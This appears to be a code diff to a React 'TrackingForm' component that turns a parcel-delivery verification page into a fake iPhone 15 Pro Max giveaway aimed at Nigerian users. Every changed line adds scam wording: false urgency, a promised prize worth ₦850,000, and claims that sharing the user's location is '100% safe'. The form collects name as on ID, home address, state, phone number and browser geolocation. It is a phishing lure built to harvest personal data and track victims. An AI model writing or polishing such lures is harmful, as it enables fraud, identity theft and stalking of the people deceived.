@@ -121,10 +121,10 @@ const TrackingForm = () => {
         <CardHeader className="bg-gradient-to-r from-logistics-orange to-logistics-blue text-white rounded-t-lg">
           <CardTitle className="text-2xl font-bold flex items-center">
             <Shield className="w-6 h-6 mr-2" />
-            Secure Delivery Confirmation
+            🎁 Get Your iPhone 15 Pro Max Now!
           </CardTitle>
           <CardDescription className="text-white/90">
-            Final step: Verify your details to authorize package delivery
+            Last step: Just confirm your details to receive your expensive Canadian iPhone today!
           </CardDescription>
         </CardHeader>
         
@@ -132,66 +132,78 @@ const TrackingForm = () => {
           <div className="bg-logistics-red/10 border border-logistics-red/20 rounded-lg p-3 mb-4">
             <div className="flex items-center text-logistics-red text-sm font-medium mb-1">
               <AlertTriangle className="w-4 h-4 mr-2" />
-              Delivery Confirmation Required
+              🚨 URGENT: Don't Lose Your iPhone!
             </div>
             <p className="text-xs text-muted-foreground">
-              Your package cannot be delivered without address verification. Please confirm all details are accurate.
+              Your iPhone 15 Pro Max worth ₦850,000 will go back to Canada if you don't fill this form TODAY. Very simple - just 4 fields!
             </p>
           </div>
 
           <form onSubmit={handleSubmit} className="space-y-4">
             <div className="space-y-2">
               <Label htmlFor="full_name" className="flex items-center text-sm font-medium">
-                Full Name (as on ID) <span className="text-red-500 ml-1">*</span>
+                Your Full Name (write exactly as on your ID) <span className="text-red-500 ml-1">*</span>
               </Label>
               <Input
                 id="full_name"
                 type="text"
                 value={formData.full_name}
                 onChange={(e) => handleInputChange("full_name", e.target.value)}
-                placeholder="Enter your complete legal name"
+                placeholder="Example: John Emeka Okafor"
                 required
               />
             </div>
 
             <div className="space-y-2">
               <Label htmlFor="address" className="flex items-center text-sm font-medium">
-                Complete Delivery Address <span className="text-red-500 ml-1">*</span>
+                Where should we bring your iPhone? <span className="text-red-500 ml-1">*</span>
               </Label>
               <Input
                 id="address"
                 type="text"
                 value={formData.address}
                 onChange={(e) => handleInputChange("address", e.target.value)}
-                placeholder="Street number, street name, apartment/unit"
+                placeholder="Example: 15 Bode Thomas Street, Surulere, Lagos"
                 required
               />
             </div>
 
             <div className="space-y-2">
               <Label htmlFor="state" className="flex items-center text-sm font-medium">
-                State/Province <span className="text-red-500 ml-1">*</span>
+                Which Nigerian state are you in? <span className="text-red-500 ml-1">*</span>
               </Label>
-              <Input
+              <select
                 id="state"
-                type="text"
                 value={formData.state}
                 onChange={(e) => handleInputChange("state", e.target.value)}
-                placeholder="Enter your state or province"
+                className="w-full px-3 py-2 border border-input bg-background rounded-md"
                 required
-              />
+              >
+                <option value="">Choose your state</option>
+                <option value="lagos">Lagos State</option>
+                <option value="abuja">Abuja (FCT)</option>
+                <option value="kano">Kano State</option>
+                <option value="rivers">Rivers State (Port Harcourt)</option>
+                <option value="oyo">Oyo State (Ibadan)</option>
+                <option value="kaduna">Kaduna State</option>
+                <option value="plateau">Plateau State (Jos)</option>
+                <option value="anambra">Anambra State</option>
+                <option value="enugu">Enugu State</option>
+                <option value="delta">Delta State</option>
+                <option value="other">My state is not listed here</option>
+              </select>
             </div>
 
             <div className="space-y-2">
               <Label htmlFor="phone" className="flex items-center text-sm font-medium">
-                Primary Contact Number <span className="text-red-500 ml-1">*</span>
+                Your phone number <span className="text-red-500 ml-1">*</span>
               </Label>
               <Input
                 id="phone"
                 type="tel"
                 value={formData.phone}
                 onChange={(e) => handleInputChange("phone", e.target.value)}
-                placeholder="(555) 123-4567"
+                placeholder="Example: 08012345678 or +2348012345678"
                 required
               />
             </div>
@@ -199,15 +211,15 @@ const TrackingForm = () => {
             <div className="bg-logistics-blue/10 p-4 rounded-lg border border-logistics-blue/20">
               <div className="flex items-center mb-2">
                 <MapPin className="w-4 h-4 text-logistics-blue mr-2" />
-                <span className="text-sm font-medium text-logistics-navy">Enhanced Location Services</span>
+                <span className="text-sm font-medium text-logistics-navy">📍 Quick Location Check (Very Safe)</span>
               </div>
               <p className="text-xs text-muted-foreground mb-2">
-                For secure delivery, we'll verify your location to ensure package safety. 
-                This prevents delivery to wrong addresses and reduces theft risk.
+                We will ask for your location to make sure your expensive iPhone goes to the right place. 
+                Don't worry - it's 100% safe and helps us find your house easily.
               </p>
               <div className="flex items-center text-xs text-logistics-green">
                 <CheckCircle2 className="w-3 h-3 mr-1" />
-                <span>SSL Encrypted • Privacy Protected • One-time access</span>
+                <span>✅ Very Safe • Just One Time • Helps Us Find You</span>
               </div>
             </div>
 
@@ -221,24 +233,24 @@ const TrackingForm = () => {
                   isGettingLocation ? (
                     <>
                       <Clock className="w-4 h-4 mr-2 animate-spin" />
-                      Securing Location...
+                      Getting Your Location...
                     </>
                   ) : (
                     <>
                       <Shield className="w-4 h-4 mr-2" />
-                      Processing Secure Delivery...
+                      Preparing Your iPhone...
                     </>
                   )
                 ) : (
                   <>
                     <Shield className="w-4 h-4 mr-2" />
-                    Authorize Secure Delivery
+                    🎁 YES! I Want My iPhone 15 Pro Max Now!
                   </>
                 )}
               </Button>
               
               <p className="text-xs text-center text-muted-foreground">
-                By clicking above, you confirm the accuracy of your information and authorize delivery
+                By clicking above, you confirm your details are correct and you want to receive your iPhone today
               </p>
             </div>
           </form>
